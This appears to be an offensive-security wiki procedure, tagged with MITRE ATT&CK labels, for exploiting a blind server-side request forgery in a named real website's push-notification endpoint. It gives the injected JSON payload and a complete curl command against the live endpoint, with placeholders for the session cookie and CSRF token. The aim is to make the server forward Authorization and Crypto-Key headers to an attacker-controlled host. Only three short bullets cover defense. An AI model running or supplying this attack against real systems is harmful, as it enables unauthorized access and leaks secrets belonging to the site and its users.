---
tags:
  - ssrf
  - exploitation
  - push-notifications
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/chaturbate-ssrf-push-subscription]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:09.079Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f81176fd-c47b-4af0-aace-cab287fabf93
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Send-SSRF-Push-Subscription-Request

## Summary

This procedure crafts and sends a modified POST request to Chaturbate's /notifications/update_push/ endpoint, injecting an attacker-controlled URL into the subscription.endpoint parameter to trigger blind SSRF and forward sensitive headers to the attacker's server.

## Description

The vulnerability stems from lack of validation on the subscription JSON payload, allowing arbitrary endpoints. In a web environment, an authenticated user sends the request via a proxy like Burp Suite. Prerequisites: Valid session tokens and attacker server. Outcomes: Server makes request to attacker URL, leaking headers like Crypto-Key and Authorization.

## Requirements

1. Valid Cookie and X-CSRFToken from prior login
2. Attacker-controlled URL (e.g., http://attacker-domain/wpush/v2/_facile?id=1)
3. HTTP client or proxy for request modification

## Defense

Defensive measures and detection strategies:

- Validate and whitelist allowed domains for push endpoints
- Monitor outbound requests from internal services to external IPs
- Implement request signing or IP allowlisting for notifications

## Objectives

1. Trigger SSRF by controlling the request target
2. Leak sensitive internal headers to attacker server
3. Demonstrate potential for internal resource access

## Instructions

### Step 1: Prepare the Payload

**Context**: Construct the subscription JSON with the malicious endpoint.

Payload example: subscription={"endpoint":"http:\/\/attacker-domain\/wpush\/v2\/_facile?id=1","unsub":false}

> Ensure URL encoding for JSON in the form data.

### Step 2: Send the Request

**Context**: Use Burp Repeater or curl to send the POST with headers.

**Command** ([[commands/chaturbate-ssrf-push-subscription]]):
```bash
curl -X POST https://chaturbate.com/notifications/update_push/ \
  -H "Host: chaturbate.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Referer: https://chaturbate.com/princesscin/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-CSRFToken: YOURCSRFHERE" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: YOURCOOKIEHERE" \
  -d 'subscription={"endpoint":"http:\/\/attacker-domain\/wpush\/v2\/_facile?id=1","unsub":false}'
```

> The server processes the subscription and forwards a request to the endpoint, including leaked headers.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/chaturbate-ssrf-push-subscription]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- ssrf
- web-exploit
